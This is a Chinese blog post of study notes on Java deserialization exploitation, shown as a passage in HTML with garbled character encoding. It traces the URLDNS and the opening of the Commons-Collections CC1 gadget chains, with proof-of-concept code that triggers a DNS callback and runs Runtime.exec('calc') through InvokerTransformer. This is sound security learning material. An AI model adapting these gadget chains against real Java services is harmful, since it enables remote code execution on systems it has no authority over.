

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="notbad3">
  <meta name="keywords" content="The quieter you become,the more you are able to hear">
  
    <meta name="description" content="ä¸€äº›javaååºåˆ—åŒ–ç›¸å…³çš„å­¦ä¹ ç¬”è®°">
<meta property="og:type" content="article">
<meta property="og:title" content="Javaå®‰å…¨åˆæ¢_CCé“¾ç¬”è®°">
<meta property="og:url" content="http://example.com/2024/04/27/BUUCTF10/index.html">
<meta property="og:site_name" content="RenDongjun&#39;s Blog">
<meta property="og:description" content="ä¸€äº›javaååºåˆ—åŒ–ç›¸å…³çš„å­¦ä¹ ç¬”è®°">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/cc1.png">
<meta property="og:image" content="http://example.com/img/CC102.png">
<meta property="og:image" content="http://example.com/img/cc103.png">
<meta property="og:image" content="http://example.com/img/cc104.png">
<meta property="og:image" content="http://example.com/img/cc105.png">
<meta property="og:image" content="http://example.com/img/cc106.png">
<meta property="og:image" content="http://example.com/img/image-20240316195339864.png">
<meta property="og:image" content="http://example.com/img/CC601.png">
<meta property="og:image" content="http://example.com/img/cc301.png">
<meta property="og:image" content="http://example.com/img/cc302.png">
<meta property="og:image" content="http://example.com/img/cc303.png">
<meta property="og:image" content="http://example.com/img/cc304.png">
<meta property="og:image" content="http://example.com/img/cc305.png">
<meta property="og:image" content="http://example.com/img/cc306.png">
<meta property="og:image" content="http://example.com/img/Debug.png">
<meta property="og:image" content="http://example.com/img/cc308.png">
<meta property="og:image" content="http://example.com/img/TrAXFilterCode.png">
<meta property="og:image" content="http://example.com/img/InstantiateTransformer.png">
<meta property="og:image" content="http://example.com/img/cc307.png">
<meta property="og:image" content="http://example.com/img/CompareError.png">
<meta property="og:image" content="http://example.com/img/CC51.png">
<meta property="og:image" content="http://example.com/img/CC52.png">
<meta property="og:image" content="http://example.com/img/CC53.png">
<meta property="og:image" content="http://example.com/img/CC5.png">
<meta property="og:image" content="http://example.com/img/HashtableReadObject.png">
<meta property="og:image" content="http://example.com/img/CC701.png">
<meta property="og:image" content="http://example.com/img/AbstractMap.png">
<meta property="og:image" content="http://example.com/img/HashTable.png">
<meta property="og:image" content="http://example.com/img/yso.png">
<meta property="og:image" content="http://example.com/img/putwhat.png">
<meta property="og:image" content="http://example.com/img/20211031133342-1bd17e2e-3a0c-1.png">
<meta property="og:image" content="http://example.com/img/iTransformers.png">
<meta property="og:image" content="http://example.com/img/equal.png">
<meta property="og:image" content="http://example.com/img/compare.png">
<meta property="og:image" content="http://example.com/img/PriorityConstructor.png">
<meta property="og:image" content="http://example.com/img/Route.png">
<meta property="og:image" content="http://example.com/img/FindCompare.png">
<meta property="og:image" content="http://example.com/img/priorityquee.png">
<meta property="og:image" content="http://example.com/img/siftDownUsingComparator.png">
<meta property="og:image" content="http://example.com/img/cb1.png">
<meta property="article:published_time" content="2024-04-27T12:08:50.000Z">
<meta property="article:modified_time" content="2024-04-27T11:25:49.994Z">
<meta property="article:author" content="notbad3">
<meta property="article:tag" content="å­¦ä¹ ç¬”è®°">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/cc1.png">
  
  
  
  <title>Javaå®‰å…¨åˆæ¢_CCé“¾ç¬”è®° - RenDongjun&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>notbad3</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>é¦–é¡µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>å½’æ¡£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>å…³äº</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Javaå®‰å…¨åˆæ¢_CCé“¾ç¬”è®°"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-04-27 20:08" pubdate>
          2024å¹´4æœˆ27æ—¥ æ™šä¸Š
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          92k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          766 åˆ†é’Ÿ
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Javaå®‰å…¨åˆæ¢_CCé“¾ç¬”è®°</h1>
            
            
              <div class="markdown-body">
                
                <p>ä¸€äº›javaååºåˆ—åŒ–ç›¸å…³çš„å­¦ä¹ ç¬”è®°</p>
<span id="more"></span>



<p>å‚è€ƒäº†æŒºå¤šå¸ˆå‚…çš„æ–‡ç« ğŸ˜€è¿™é‡Œåªåšç®€å•æ•´ç†ï¼Œè¯¦ç»†å†…å®¹æ¨èè¿™ä½å¸ˆå‚…ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/">Java</a></p>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>è°ƒç”¨é¡ºåºï¼š</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">readObject</span> -&gt;</span><br>  H<span class="hljs-function"><span class="hljs-title">ashMap</span>.putVal -&gt;</span><br>	H<span class="hljs-function"><span class="hljs-title">ashMap</span>.hash -&gt;</span><br>		URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">hashCode</span>() -&gt;</span><br>			URLS<span class="hljs-function"><span class="hljs-title">treamHandler</span>-&gt;</span>getHostAddress()<br></code></pre></td></tr></table></figure>

<p>ç®€å•è·Ÿä¸€ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//çœç•¥ä¸€äº›</span><br>	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">//--------------------------------------------------------</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-comment">//æ³¨æ„è¿™ä¸ªkey</span><br><span class="hljs-comment">//---------------------------------------------------------</span><br><span class="hljs-comment">//URL.java</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br><span class="hljs-comment">//----------------------------------------------------------</span><br>	<span class="hljs-keyword">transient</span> URLStreamHandler handler;<br><span class="hljs-comment">//----------------------------------------------------------</span><br><span class="hljs-comment">//URLStreamHandler.java</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>        <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>            h += protocol.hashCode();<br><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br><span class="hljs-comment">//getHostAddress</span><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-keyword">if</span> (u.hostAddress != <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> u.hostAddress;<br></code></pre></td></tr></table></figure>

<p><code>put</code>æ–¹æ³•é‡Œçš„<code>key</code>æ”¾ä¸ªURLï¼Œ<code>put</code>è§¦å‘åŒç±»ä¸‹çš„<code>hash</code>æ–¹æ³•<code>hash</code>æ–¹æ³•è§¦å‘åŒç±»ä¸‹çš„<code>key.hashcode</code>ï¼Œç°åœ¨è¿™ä¸ªkeyæ˜¯URLç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚å…¶å®å°±æ˜¯è°ƒç”¨äº†<code>URL.java</code>ä¸‹çš„<code>hashCode</code>æ–¹æ³•ã€‚<code>hashCode(this)</code>è¿™é‡Œçš„<code>this</code>æ˜¯è°ƒç”¨è¯¥<code>hashCode</code>æ–¹æ³•çš„å¯¹è±¡æœ¬èº«ï¼Œå°±æ˜¯åˆšæ‰é‚£ä¸ªURLå®ä¾‹ã€‚æœ€ç»ˆè°ƒç”¨<code>getHostAddress</code>å‘èµ·ä¸€ä¸ªDNSè¯·æ±‚ã€‚</p>
<p>åˆæ­¥<code>EXP</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JAVA">HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();   <br>hashmap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;dnslogç”Ÿæˆçš„URL&quot;</span>),<span class="hljs-number">1</span>);<br><br>serialize(hashmap);<br></code></pre></td></tr></table></figure>

<p>è¿™æ—¶ä¼šå‘ç°<code>put</code>çš„æ—¶å€™å°±èƒ½å‘èµ·DNSæŸ¥è¯¢ï¼Œè€Œä¸æ˜¯ååºåˆ—åŒ–ï¼Œé—®é¢˜å‡ºåœ¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//HashMap.java</span><br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>      <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>  &#125;<br><span class="hljs-comment">//URL.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>          <span class="hljs-keyword">return</span> hashCode;<br><br>      hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>      <span class="hljs-keyword">return</span> hashCode;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œå¦‚æœ<code>hashCode</code>ä¸ç­‰äº-1çš„è¯å°±ä¼šèµ°æˆ‘ä¸Šé¢å†™é‚£æ®µé“¾å­(è€Œä¸€å¼€å§‹å®šä¹‰<code> HashMap</code> ç±»çš„æ—¶å€™<code>hashCode</code>çš„åˆå§‹å€¼å°±æ˜¯-1ï¼Œç›¸å½“äºæˆ‘ä»¬åˆ©ç”¨<code>put</code>é‡Œçš„<code>hash</code>åšå¼€å¤´èµ°å®Œäº†è¿™æ¡é“¾å­ï¼Œè€Œä¸æ˜¯åˆ©ç”¨<code>readObject</code>é‡Œçš„hash)ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦é€šè¿‡åå°„ï¼Œç›®çš„æ˜¯putæ—¶hashcodeä¸ç­‰äº-1ï¼Œååºåˆ—åŒ–æ—¶ç­‰äº-1ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br> <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);  <br> HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();  <br> <span class="hljs-comment">// è¿™é‡Œä¸è¦å‘èµ·è¯·æ±‚  </span><br> <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com&quot;</span>); <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <br> hashcodefile.setAccessible(<span class="hljs-literal">true</span>);  <br> hashcodefile.set(url,<span class="hljs-number">1234</span>);<span class="hljs-comment">//è¿™é‡Œåªè¦ä¸æ˜¯-1å°±è¡Œ</span><br> hashmap.put(url,<span class="hljs-number">1</span>);  <br> <span class="hljs-comment">// è¿™é‡ŒæŠŠ hashCode æ”¹ä¸º -1ï¼› é€šè¿‡åå°„çš„æŠ€æœ¯æ”¹å˜å·²æœ‰å¯¹è±¡çš„å±æ€§  </span><br> hashcodefile.set(url,-<span class="hljs-number">1</span>); <span class="hljs-comment">//è¿™é‡Œæ”¹æˆ-1ï¼Œè§¦å‘hashCodeä¸‹çš„handler.hashCode(this);</span><br> serialize(hashmap);  <br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>åˆæ­¥å†™ä¸€ä¸‹è°ƒç”¨é¡ºåºï¼š</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Invokertransformer.transform -&gt;<br>   <span class="hljs-function"><span class="hljs-params">(TransformedMap.java)</span>-&gt;</span>checksetvalueæ–¹æ³•<br>	  (TransformedMap.java)valueTransformer.transform -&gt;<br>		<span class="hljs-function"><span class="hljs-params">(TransformedMap.javaçš„æ„é€ å‡½æ•°)</span> -&gt;</span>å®šä¹‰äº†è¿™ä¸ªvalueTransformerï¼Œä½†æ„é€ æ–¹æ³•çš„ä½œç”¨åŸŸæ˜¯protectedï¼Œè¦æƒ³åŠæ³•æ‰¾åˆ«çš„æ–¹æ³•å»è°ƒç”¨è¿™ä¸ªæ„é€ æ–¹æ³•ä»è€Œè®©è¿™ä¸ªvalueTransformerå¯æ§<br>			(è¿™é‡Œæ‰¾åˆ°äº†åŒç±»ä¸‹çš„decorateæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œç›´æ¥<span class="hljs-keyword">new</span>äº†ä¸€ä¸ªTransformedMapå¯¹è±¡ï¼Œéƒ½å®ä¾‹åŒ–å¯¹è±¡äº†è‚¯å®šä¼šè°ƒç”¨å®ƒçš„æ„é€ æ–¹æ³•)<br></code></pre></td></tr></table></figure>

<p>æ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹å°±æ˜¯è¿™ä¸ª<code>Invokertransformer</code>ä¸‹çš„<code>transform</code>æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//InvokerTransformer.java</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br><span class="hljs-comment">//çœ‹ä¸‹è¿™äº›å‚æ•°ï¼š</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨è¿™ä¸¤ä¸ªä¸œè¥¿å¼¹ä¸ªè®¡ç®—å™¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokeTransformerTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;  <br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);  <br> invokerTransformer.transform(runtime);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>å…¶å®å°±æ˜¯ä¿®æ”¹äº†åˆ©ç”¨åå°„å¼¹è®¡ç®—å™¨çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.omg.SendingContext.RunTime;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokeTransformerTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br> method.setAccessible(<span class="hljs-literal">true</span>);  <br> method.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç„¶åå¯»æ‰¾åŒåå‡½æ•°çš„ä¸åŒè°ƒç”¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TransformedMap.javaä¸‹å­˜åœ¨</span><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™ä¸ª<code>checkSetValue</code>æ–¹æ³•ï¼å…¶å®å°±æ˜¯æŠŠ<code>invokertransformer</code>æ¢æˆäº†<code>valueTransformer</code>ï¼Œç„¶å<code>value</code>æ”¾ä¸ªå®ä¾‹åŒ–åçš„<code>Runtime</code>ã€‚çœ‹çœ‹è¿™ä¸œè¥¿èƒ½å¦å®Œç¾æ›¿æ¢<code>invokertransformer</code>ï¼š</p>
